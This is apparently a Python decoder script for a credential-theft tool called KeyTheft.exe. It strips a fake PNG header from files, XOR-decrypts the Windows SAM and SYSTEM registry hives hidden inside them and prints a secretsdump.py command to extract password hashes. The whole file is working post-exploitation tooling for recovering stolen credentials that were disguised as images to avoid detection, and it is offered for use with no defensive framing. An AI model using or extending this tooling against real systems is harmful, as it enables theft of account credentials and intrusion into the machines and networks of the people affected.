#!/usr/bin/env python3
"""
decode.py, Restore KeyTheft PNG-disguised hive files to original format.

Usage:
    python3 decode.py <xor_key_hex> sam.png [system.png]
    secretsdump.py -sam sam.hiv -system system.hiv LOCAL

File layout (produced by KeyTheft.exe):
    [8  bytes] PNG signature
    [25 bytes] IHDR chunk (1x1 RGBA)
    [N  bytes] XOR-encrypted registry hive data

The XOR key is printed by KeyTheft.exe at runtime — it is NOT stored in the file.
"""

import sys
import os

PNG_HDR_SIZE = 33  # 8 (PNG sig) + 25 (IHDR chunk)


def decode(path, key):
    """Decode a single PNG-disguised hive file."""
    if not os.path.isfile(path):
        print(f"[-] {path}: file not found")
        return None

    with open(path, "rb") as f:
        raw = f.read()

    if len(raw) <= PNG_HDR_SIZE:
        print(f"[-] {path}: file too small ({len(raw)} bytes)")
        return None

    if raw[:4] != b"\x89PNG":
        print(f"[-] {path}: missing PNG signature — not a KeyTheft output?")
        return None

    # Strip PNG header, decrypt payload
    encrypted = raw[PNG_HDR_SIZE:]
    klen = len(key)
    decrypted = bytearray(len(encrypted))

    for i in range(len(encrypted)):
        decrypted[i] = encrypted[i] ^ key[i % klen]

    # Verify regf magic
    if decrypted[:4] == b"regf":
        print(f"[+] {path}: valid registry hive (regf magic confirmed)")
    else:
        print(f"[!] {path}: WARNING — no regf magic after decryption (wrong key?)")

    # Write output with .hiv extension
    base = os.path.splitext(path)[0]
    out_path = base + ".hiv"

    with open(out_path, "wb") as f:
        f.write(decrypted)

    print(f"    -> {out_path} ({len(decrypted):,} bytes)")
    return out_path


def main():
    if len(sys.argv) < 3:
        print("KeyTheft Decoder — restore PNG-disguised hive files")
        print()
        print("Usage:")
        print("  python3 decode.py <xor_key_hex> <file.png> [file2.png ...]")
        print()
        print("Example:")
        print("  python3 decode.py a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6 sam.png system.png")
        print("  secretsdump.py -sam sam.hiv -system system.hiv LOCAL")
        sys.exit(1)

    # Parse XOR key
    try:
        key = bytes.fromhex(sys.argv[1])
    except ValueError:
        print(f"[-] Invalid hex key: {sys.argv[1]}")
        print("    Key must be a hex string (e.g., a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6)")
        sys.exit(1)

    if len(key) != 16:
        print(f"[-] Key must be 16 bytes (32 hex chars), got {len(key)}")
        sys.exit(1)

    # Decode each file
    outputs = []
    for path in sys.argv[2:]:
        out = decode(path, key)
        if out:
            outputs.append(out)

    # Print secretsdump command if both SAM and SYSTEM were decoded
    if len(outputs) >= 2:
        sam = next((o for o in outputs if "sam" in o.lower()), outputs[0])
        sys_hiv = next((o for o in outputs if "system" in o.lower()), outputs[1])
        print(f"\n  secretsdump.py -sam {sam} -system {sys_hiv} LOCAL")
    elif outputs:
        print(f"\n  File decoded. Provide both SAM and SYSTEM hives to secretsdump.")


if __name__ == "__main__":
    main()
